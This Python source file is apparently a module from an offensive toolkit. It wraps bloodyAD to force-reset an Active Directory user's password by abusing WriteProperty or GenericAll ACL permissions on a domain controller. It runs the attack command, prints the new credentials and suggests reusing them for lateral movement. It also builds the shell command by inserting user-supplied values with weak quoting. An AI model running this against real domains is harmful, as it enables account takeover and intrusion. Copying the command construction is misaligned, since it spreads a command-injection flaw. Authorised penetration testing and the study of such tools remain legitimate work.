"""
BloodyAD Password Reset Module
Reset passwords for users when you have WriteProperty or GenericAll permissions
"""

from core.module_base import ModuleBase, ModuleType, Platform


class BloodySetPassword(ModuleBase):
    """
    BloodyAD password reset module.
    Abuses ACL permissions to reset target user passwords.
    """

    def __init__(self):
        super().__init__()
        self.name = "bloody_setpass"
        self.description = "BloodyAD password reset - abuse ACL to change user passwords"
        self.author = "UwU Toolkit"
        self.version = "1.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ad", "acl", "password", "abuse", "bloodyad", "lateral"]
        self.references = [
            "https://github.com/CravateRouge/bloodyAD",
            "https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword"
        ]

        # Core options
        self.register_option("RHOSTS", "Domain Controller IP", required=True)
        self.register_option("DOMAIN", "Domain name", required=True)
        self.register_option("USER", "Username with ACL permissions", required=True)
        self.register_option("PASS", "Password for USER", required=True)

        # Target options
        self.register_option("TARGET_USER", "Target user to reset password", required=True)
        self.register_option("NEW_PASS", "New password for target", required=True)

        # Container
        self.register_option("EXEGOL_CONTAINER", "Exegol container (auto-detect if empty)", default="")

    def run(self) -> bool:
        dc_ip = self.get_option("RHOSTS")
        domain = self.get_option("DOMAIN")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        target_user = self.get_option("TARGET_USER")
        new_pass = self.get_option("NEW_PASS")

        self.print_status(f"Target DC: {dc_ip}")
        self.print_status(f"Domain: {domain}")
        self.print_status(f"Attacking User: {user}")
        self.print_status(f"Target User: {target_user}")
        self.print_status(f"New Password: {new_pass}")
        self.print_line()

        # Build command
        cmd = f"bloodyAD -u '{user}' -p '{password}' -d {domain} --host {dc_ip} set password {target_user} '{new_pass}'"

        self.print_status(f"Command: bloodyAD -u {user} -p [HIDDEN] -d {domain} --host {dc_ip} set password {target_user} [HIDDEN]")
        self.print_line()

        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)
        output = stdout + stderr

        # Check result
        if "Password changed successfully" in output or ret == 0:
            self.print_good(f"Password changed successfully!")
            self.print_good(f"New credentials: {target_user}:{new_pass}")
            self.print_line()
            self.print_status("Next steps:")
            self.print_status(f"  setg USER {target_user}")
            self.print_status(f"  setg PASS {new_pass}")
            return True
        else:
            self.print_error("Password change failed")
            for line in output.split('\n'):
                if line.strip():
                    self.print_error(f"  {line}")
            return False

    def check(self) -> bool:
        ret, stdout, stderr = self.run_in_exegol("which bloodyAD", timeout=10)
        return ret == 0
